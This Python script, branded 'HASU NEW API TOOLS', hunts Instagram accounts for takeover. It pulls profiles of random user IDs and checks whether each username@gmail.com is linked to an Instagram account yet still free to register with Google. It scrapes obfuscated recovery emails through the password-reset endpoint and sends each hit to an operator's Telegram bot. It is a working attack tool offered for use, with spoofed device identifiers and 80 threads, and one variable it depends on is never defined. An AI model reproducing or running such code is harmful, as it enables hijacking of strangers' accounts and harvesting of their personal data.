
import sys
import os
import time
import random
import json
import re
import requests
import threading
import uuid
import secrets
import base64
import httpx
import urllib.parse
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
from user_agent import generate_user_agent
from cfonts import render



THREADS = 80

GOLD = '\x1b[38;5;220m'
CYAN = '\x1b[38;5;51m'
PINK = '\x1b[38;5;213m'
GREEN = '\x1b[38;5;120m'
RED = '\x1b[38;5;196m'
YELLOW = '\x1b[38;5;226m'
WHITE = '\x1b[1;37m'
DIM = '\x1b[2;37m'
RESET = '\033[0m'
BOLD = '\x1b[1m'
UNDERLINE = '\x1b[4m'

logo = render('HASU', font='block', colors=['white', 'yellow', 'yellow'], align='center', space=True)

print(logo)
print('\x1b[1;39m' + '═' * 60)


chat_id = input(f'{RED}Enter Chat Id ==>{RESET}')
print('')
bot_token = input(f'{GOLD}Enter Bot Token ==> {RESET}')
print('')
os.system('cls' if os.name == 'nt' else 'clear')

print('\x1b[1;39m' + '═' * 60)
print(render('HASU', font='block', colors=['white', 'yellow', 'yellow'], align='center', space=True))
print('\x1b[1;39m' + '═' * 60)
print(f'{GOLD}HASU NEW API TOOLS ...........(Turbo + Expiry){RESET}')


hits = 0
good = 0
bad = 0
current_email = "HASU NEW API TOOLS......."

def display():
    global hits, good, bad, current_email
    os.system('cls' if os.name == 'nt' else 'clear')
    print('\x1b[1;39m' + '═' * 60)
    print(f'{GOLD}   HASU NEW API TOOLS{RESET}')
    print('\x1b[1;39m' + '═' * 60)
    stats = (
        
        f'{GREEN}HITS: {hits}{RESET}   {GOLD} GOOD : {good}{RESET}   {RED}BAD : {bad}{RESET}   {WHITE} 𝐃𝐄𝐕𝐋𝐎𝐏𝐄𝐑 #𝗛𝗔𝗦𝗨 ♛{RESET}\n'
        
        
        f'{WHITE}│{RESET}  {CYAN} ACTIVE {WHITE}{current_email[:42]}{RESET}\n'
        
    )
    sys.stdout.write(stats)
    sys.stdout.flush()

class GoogleChecker:
    def __init__(self):
        self.yy = 'azertyuiopmlkjhgfdsqwxcvbn'
        threading.Thread(target=self._refresh_token, daemon=True).start()

    def _generate_ua(self):
        return generate_user_agent()

    def _refresh_token(self):
        while True:
            try:
                n1 = ''.join(random.choice(self.yy) for _ in range(random.randrange(6, 9)))
                n2 = ''.join(random.choice(self.yy) for _ in range(random.randrange(3, 9)))
                host = ''.join(random.choice(self.yy) for _ in range(random.randrange(15, 30)))

                headers = {
                    "accept": "*/*",
                    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
                    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                    "google-accounts-xsrf": "1",
                    "sec-ch-ua": '"Not)A;Brand";v="24", "Chromium";v="116"',
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": '"Android"',
                    "user-agent": self._generate_ua(),
                }

                res1 = requests.get(
                    'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
                    headers=headers
                )
                tok = re.search(
                    r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                    res1.text
                )
                if tok:
                    tl = tok.group(2)
                    cookies = {'__Host-GAPS': host}
                    headers2 = {
                        'authority': 'accounts.google.com',
                        'accept': '*/*',
                        'accept-language': 'en-US,en;q=0.9',
                        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                        'google-accounts-xsrf': '1',
                        'origin': 'https://accounts.google.com',
                        'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
                        'user-agent': self._generate_ua(),
                    }
                    data = {
                        'f.req': f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                        'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
                    }
                    response = requests.post(
                        'https://accounts.google.com/_/signup/validatepersonaldetails',
                        cookies=cookies,
                        headers=headers2,
                        data=data,
                        timeout=15
                    )
                    if '",null,"' in response.text:
                        tl = response.text.split('",null,"')[1].split('"')[0]
                    host = response.cookies.get('__Host-GAPS', host)
                    with open('tl.txt', 'w') as f:
                        f.write(tl + '//' + host + '\n')
                    time.sleep(random.uniform(10, 30))
                    continue
            except:
                pass

            try:
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en',
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'origin': 'https://accounts.google.com',
                    'referer': 'https://accounts.google.com/',
                    'user-agent': self._generate_ua(),
                    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                    'x-same-domain': '1',
                    'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                }
                params = {
                    'rpcids': 'NHJMOd',
                    'source-path': '/lifecycle/steps/signup/username',
                    'hl': 'en'
                }
                fake_email = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890.', k=random.randint(16, 26)))
                data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{fake_email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D'
                response = requests.post(
                    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                    params=params, headers=headers, data=data, timeout=15
                )
                tl_match = re.search(r'"TL:([^"]+)"', response.text)
                if tl_match:
                    tl = tl_match.group(1)
                    host = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(15, 30)))
                    with open('tl.txt', 'w') as f:
                        f.write(tl + '//' + host + '\n')
                    time.sleep(random.uniform(10, 30))
                    continue
            except:
                pass

            time.sleep(random.uniform(5, 15))

    def check_availability(self, email):
        if '@' in email:
            email = email.split('@')[0]

        try:
            with open('tl.txt', 'r') as f:
                line = f.read().strip()
                if not line:
                    raise Exception("Empty tl")
                tl, host = line.split('//')
        except:
            time.sleep(3)
            with open('tl.txt', 'r') as f:
                line = f.read().strip()
                tl, host = line.split('//')

        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
            'user-agent': generate_user_agent(),
        }
        params = {'TL': tl}
        data = (
            f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F'
            f'&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
            f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
            f'&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888'
            f'&cookiesDisabled=false'
            f'&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D'
            f'&gmscoreversion=undefined&flowName=GlifWebSignIn&'
        )

        response = requests.post(
            'https://accounts.google.com/_/signup/usernameavailability',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
            timeout=10
        )

        if '"gf.uar",1' in response.text:
            return 'good'
        elif '"er",null,null,null,null,400' in response.text:
            time.sleep(1)
            return self.check_availability(email)
        else:
            return 'bad'

class InstagramChecker:
    def __init__(self):
        self.session = requests.Session()
        self.csrf = None
        self.lsd = None
        self.doc_id = "26672929172408668"
        self.lock = threading.Lock()

    def _ensure_tokens(self):
        with self.lock:
            if self.csrf and self.lsd:
                return True
        try:
            headers = {
                'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36",
                'x-ig-app-id': "936619743392459",
                'origin': "https://www.instagram.com",
                'referer': "https://www.instagram.com/",
            }
            response = self.session.get('https://www.instagram.com/', headers=headers, timeout=20)
            if response.status_code == 200:
                csrf = response.cookies.get('csrftoken', '')
                match = re.search(r'"LSD",\[\],\{"token":"([^"]+)"\}', response.text)
                lsd = match.group(1) if match else None
                if csrf and lsd:
                    with self.lock:
                        self.csrf = csrf
                        self.lsd = lsd
                    return True
        except:
            pass
        return False

    def _check_bloks(self, email):
        url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
        device = "android-" + ''.join(random.choices('abcdef0123456789', k=16))
        family = str(uuid.uuid4())
        android = "android-" + ''.join(random.choices('abcdef0123456789', k=16))
        waterfall = str(uuid.uuid4())

        payload = {
            'params': "{\"client_input_params\":{\"aac\":\"{\\\"aac_init_timestamp\\\":"+ str(int(time.time())) +",\\\"aacjid\\\":\\\""+ str(uuid.uuid4()) +"\\\",\\\"aaccs\\\":\\\""+ secrets.token_urlsafe(32) +"\\\"}\",\"flash_call_permissions_status\":{\"READ_PHONE_STATE\":\"PERMANENTLY_DENIED\",\"READ_CALL_LOG\":\"DENIED\",\"ANSWER_PHONE_CALLS\":\"DENIED\"},\"was_headers_prefill_available\":0,\"network_bssid\":null,\"sfdid\":\"\",\"fetched_email_token_list\":{},\"search_query\":\""+ email +"\",\"auth_secure_device_id\":\"\",\"ig_oauth_token\":[],\"cloud_trust_token\":null,\"was_headers_prefill_used\":0,\"sso_accounts_auth_data\":[],\"encrypted_msisdn\":\"\",\"device_network_info\":null,\"text_input_id\":\"akyuf0:61\",\"zero_balance_state\":null,\"android_build_type\":\"release\",\"accounts_list\":[],\"is_oauth_without_permission\":0,\"ig_android_qe_device_id\":\""+ device +"\",\"gms_incoming_call_retriever_eligibility\":\"client_not_supported\",\"search_screen_type\":\"email_or_username\",\"is_whatsapp_installed\":1,\"lois_settings\":{\"lois_token\":\"\"},\"ig_vetted_device_nonce\":null,\"headers_infra_flow_id\":\"\",\"fetched_email_list\":[]},\"server_params\":{\"event_request_id\":\""+ str(uuid.uuid4()) +"\",\"is_from_logged_out\":0,\"layered_homepage_experiment_group\":null,\"device_id\":\""+ android +"\",\"login_surface\":\"login_home\",\"waterfall_id\":\""+ waterfall +"\",\"INTERNAL__latency_qpl_instance_id\":6.3987980400102E13,\"is_platform_login\":0,\"context_data\":\"\",\"login_entry_point\":\"logged_out\",\"INTERNAL__latency_qpl_marker_id\":36707139,\"family_device_id\":\""+ family +"\",\"offline_experiment_group\":\"caa_iteration_v3_perf_ig_4\",\"access_flow_version\":\"pre_mt_behavior\",\"is_from_logged_in_switcher\":0,\"qe_device_id\":\""+ device +"\"}}",
            'bk_client_context': "{\"bloks_version\":\"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b\",\"styles_id\":\"instagram\"}",
            'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
        }
        headers = {
            'User-Agent': "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; en_US; 465123678)",
            'accept-language': "en-IN, en-US",
            'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
            'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
            'x-ig-android-id': android,
            'x-ig-app-id': "567067343352427",
            'x-ig-app-locale': "en_IN",
            'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
            'x-ig-device-id': device,
            'x-ig-family-device-id': family,
            'x-ig-timezone-offset': str(int(datetime.now().astimezone().utcoffset().total_seconds())),
            'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
            'x-pigeon-rawclienttime': str(time.time()),
            'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
            'sec-ch-ua': '"Google Chrome";v="155", "Chromium";v="155", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
        }
        try:
            resp = requests.post(url, data=payload, headers=headers, timeout=20)
            if f"{email}" in resp.text:
                return True
            else:
                return False
        except:
            return False

    def _check_ajax_recovery(self, email):
        if not self._ensure_tokens():
            return False
        url = "https://www.instagram.com/ajax/bz?__a=1&__ccg=UNKNOWN&__comet_req=7&__crn=comet.igweb.PolarisCAAIGAccountRecoverySearchRoute&__d=www&__hs=20737.HYP%3Ainstagram_web_pkg.2.1...0&__hsi=7695230202968783679&__req=k&__rev=1049809842&__s=og3gji%3A0mucgp%3A0h8vjq&__spin_b=trunk&__spin_r=1049809842&__spin_t=1791685401&__user=0&dpr=1&hl=en&jazoest=22330&lsd=" + str(self.lsd) + "&ph=C3&qpl_active_flow_ids=516759801"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryzoj1LgS6xzyekDDY',
            'x-csrftoken': self.csrf,
            'x-ig-app-id': '936619743392459',
            'x-fb-lsd': self.lsd,
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/accounts/password/reset/?hl=en'
        }
        cookies = {'csrftoken': self.csrf}
        
        form_data = (
            "------WebKitFormBoundaryzoj1LgS6xzyekDDY\r\n"
            "Content-Disposition: form-data; name=\"q\"\r\n\r\n"
            f"{email}\r\n"
            "------WebKitFormBoundaryzoj1LgS6xzyekDDY--\r\n"
        )
        try:
            r = self.session.post(url, headers=headers, cookies=cookies, data=form_data, timeout=10)
            if r.status_code == 200:
                if email in r.text or "obfuscated_email" in r.text or "contact_point" in r.text:
                    return True
            return False
        except:
            return False

    def check_email(self, email):
        if self._check_bloks(email):
            return True
        if self._check_ajax_recovery(email):
            return True
        return False

    def get_user_data(self, user_id):
        if not self._ensure_tokens():
            return None
        url = "https://www.instagram.com/api/graphql"
        headers = {
            'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36",
            'Content-Type': 'application/x-www-form-urlencoded',
            'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
            'x-ig-app-id': '936619743392459',
            'x-fb-lsd': self.lsd,
            'x-csrftoken': self.csrf,
            'x-fb-friendly-name': 'PolarisProfilePageContentQuery',
            'sec-ch-ua-platform': '"Android"',
            'origin': 'https://www.instagram.com',
            'sec-fetch-site': 'same-origin'
        }
        cookies = {'rur': '"HIL\\0545636887483\\0541808136332:01fe43b89fcef61b8a466bfa81acf2b1bbab08f406fc99b1da8b7d889fa68683a3364c43"'}
        variables = {
            "enable_integrity_filters": True,
            "id": str(user_id),
            "__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider": True,
            "__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider": False,
        }
        payload = {
            'lsd': self.lsd,
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'PolarisProfilePageContentQuery',
            'variables': json.dumps(variables),
            'server_timestamps': 'true',
            'doc_id': self.doc_id,
        }
        try:
            response = self.session.post(url, headers=headers, data=payload, cookies=cookies, timeout=20)
            if response.status_code == 200:
                data = response.json()
                user = data.get('data', {}).get('user')
                if user and user.get('username'):
                    return user
        except:
            pass
        return None

class ReportManager:
    def __init__(self, token, chat_id, proxy=None):
        self.token = token
        self.chat_id = chat_id
        self.proxy = proxy
        self.log_file = "telegram_errors.log"
        self._telegram_working = True
        self._error_logged = False

    def _send_telegram_with_retry(self, msg, retries=3, delay=2):
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        payload = {"chat_id": self.chat_id, "text": msg, "parse_mode": "HTML"}
        session = requests.Session()
        if self.proxy:
            session.proxies.update(self.proxy)

        for attempt in range(retries):
            try:
                r = session.post(url, json=payload, timeout=15)
                if r.status_code == 200:
                    return True
                else:
                    if not self._error_logged:
                        with open(self.log_file, 'a') as f:
                            f.write(f"Telegram returned {r.status_code}: {r.text}\n")
                        self._error_logged = True
                    time.sleep(delay * (attempt + 1))
            except Exception as e:
                if not self._error_logged:
                    with open(self.log_file, 'a') as f:
                        f.write(f"Telegram send error: {e}\n")
                    self._error_logged = True
                time.sleep(delay * (attempt + 1))
        return False

    def send_telegram(self, msg):
        if not self._telegram_working:
            return False
        success = self._send_telegram_with_retry(msg)
        if not success:
            self._telegram_working = False
        return success

    def save_to_file(self, msg, filename='hasupyy.txt'):
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f'{msg}\n')

    def _get_monetization_status(self, data):
        followers = data.get('follower_count', 0)
        posts = data.get('media_count', 0)
        is_private = data.get('is_private', True)
        if followers >= 50 and posts >= 0 and not is_private:
            return "✅ Eligible"
        else:
            return "❌ Not Eligible"

    def format_result(self, data):
        username = data.get('username', '')
        full_name = data.get('full_name', '')
        followers = data.get('follower_count') or 0
        following = data.get('following_count') or 0
        posts = data.get('media_count') or 0
        email = data.get('email', f"{username}@gmail.com")
        domain = email.split('@')[1] if '@' in email else 'gmail.com'
        bio = data.get('biography', '')[:50]
        user_id = data.get('pk', 0)

        try:
            pk = int(user_id)
            year_ranges = [
                (1, 5000000, 2010),
                (5000001, 17750000, 2011),
                (17750001, 279760000, 2012),
                (279760001, 900990000, 2013),
                (900990001, 1629010000, 2014),
                (1629010001, 2369359761, 2015),
                (2369359762, 4239516754, 2016),
                (4239516755, 6345108209, 2017),
                (6345108210, 10016232395, 2018),
                (10016232396, 27238602159, 2019),
                (27238602160, 43464475395, 2020),
                (43464475395, 50289297647, 2021),
                (50289297647, 57464707082, 2022),
                (57464707082, 63313426938, 2023),
                (63313426938, 70134323896, 2024),
                (70134323896, 78313496938, 2025),
            ]
            registration_year = "2023+"
            for low, high, y in year_ranges:
                if low <= pk <= high:
                    registration_year = str(y)
                    break
        except:
            registration_year = "Unknown"

        rest_info = self._fetch_reset_email(username)
        monetization = self._get_monetization_status(data)
        meta = f"Posts: {posts} | Bio: {bio if bio else 'N/A'} | Monetization: {monetization}"

        lines = [
            "╭━━━━━〔 ⚜️𝐇𝐀𝐒𝐔⚜️ 〕━━━━━╮",
            "                   𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗛𝗜𝗧𝗦 𝗕𝗬 #𝗛𝗔𝗦𝗨  🌷💕",
            "├═════════════════════┤",
            f"│  Name        :: {(full_name if full_name else 'N/A')}",
            f"│  Username    :: @{username}",
            f"│  Email       :: {username}@{domain}",
            f"│  Followers   :: {followers}",
            f"│   Following   :: {following}",
            f"│  Account ID  :: {user_id}",
            f"│  Year        :: {registration_year}",
            f"│  Reset Info  :: {rest_info}",
            f"│  Meta Data   :: {meta}",
            f"│  Profile     :: instagram.com/{username}",
            "├══════════════════════┤",
            
            "╭━━━━━━━━━━━━━━━━━━╮",
            "│  👑 𝐃𝐄𝐕𝐋𝐎𝐏𝐄𝐑 @hasupyy ",
            "╰━━━━━━━━━━━━━━━━━━╯",
        ]

        colored_lines = []
        for line in lines:
            if '::' in line:
                label, value = line.split('::', 1)
                colored_line = f"{CYAN}{label.strip()}{RESET} :: {WHITE}{value.strip()}{RESET}"
                colored_lines.append(colored_line)
            elif line.startswith('│') and '✧' in line:
                colored_lines.append(f"{GOLD}{line}{RESET}")
            elif line.startswith('│') and ('Owner' in line or 'CHAT' in line):
                colored_lines.append(f"{PINK}{line}{RESET}")
            elif line.startswith(('╭', '├', '╰')):
                colored_lines.append(f"{DIM}{line}{RESET}")
            else:
                colored_lines.append(f"{WHITE}{line}{RESET}")

        console_msg = '\n'.join(colored_lines)

        html_lines = []
        for line in lines:
            if '::' in line:
                label, value = line.split('::', 1)
                html_line = f"<b>{label.strip()}</b> :: {value.strip()}"
                html_lines.append(html_line)
            elif line.startswith('│') and '✧' in line:
                html_lines.append(f"<b>{line}</b>")
            elif line.startswith('│') and ('Owner' in line or 'CHAT' in line):
                html_lines.append(f"<b>{line}</b>")
            else:
                html_lines.append(line)
        telegram_msg = '\n'.join(html_lines)

        return console_msg, telegram_msg

    def _fetch_reset_email(self, username):
        try:
            headers = {
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Mobile Safari/537.36",
                "x-ig-app-id": "936619743392459",
                "x-requested-with": "XMLHttpRequest",
                "origin": "https://www.instagram.com",
                "referer": "https://www.instagram.com/accounts/password/reset/",
            }
            client = httpx.Client(http2=True, headers=headers, timeout=10)
            r = client.post(
                "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
                data={"email_or_username": username}
            )
            if r.status_code == 200:
                data = r.json()
                if data.get("status") == "ok":
                    return data.get('obfuscated_email') or data.get('contact_point') or "-"
            return "-"
        except:
            return "-"

reporter = ReportManager(bot_token, chat_id)
google = GoogleChecker()
insta = InstagramChecker()

def process_user():
    global hits, good, bad, current_email
    while True:
        if time.time() > expire_time:
            print(f"\n{WHITE}⏰ Time expired. Stopping workers.{RESET}")
            sys.exit(0)

        try:
            user_id = random.randint(2500000000, 21254029834)
            user_data = insta.get_user_data(user_id)
            if not user_data:
                time.sleep(random.uniform(0.05, 0.15))
                continue

            username = user_data.get('username')
            if not username:
                continue

            email = f"{username}@gmail.com"
            current_email = email
            display()

            if insta.check_email(email):
                good += 1
                display()

                if google.check_availability(email) == 'good':
                    hits += 1
                    display()

                    profile = {
                        'username': username,
                        'email': email,
                        'full_name': user_data.get('full_name', ''),
                        'follower_count': user_data.get('follower_count') or 0,
                        'following_count': user_data.get('following_count') or 0,
                        'media_count': user_data.get('media_count') or 0,
                        'is_private': user_data.get('is_private', False),
                        'biography': user_data.get('biography', ''),
                        'pk': user_data.get('pk', ''),
                    }
                    console_msg, telegram_msg = reporter.format_result(profile)
                    print('\n' + GOLD + '═' * 60 + RESET)
                    print(console_msg)
                    print(GOLD + '═' * 60 + RESET)
                    plain_msg = re.sub(r'<[^>]+>', '', telegram_msg)
                    reporter.save_to_file(plain_msg)
                    reporter.send_telegram(telegram_msg)
            else:
                bad += 1
                display()

            time.sleep(random.uniform(0.05, 0.15))

        except Exception:
            time.sleep(random.uniform(0.1, 0.2))
            continue

if __name__ == "__main__":
    display()
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for _ in range(THREADS):
            executor.submit(process_user)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print('\n' + YELLOW + 'HASU NEW API TOOLS' + RESET)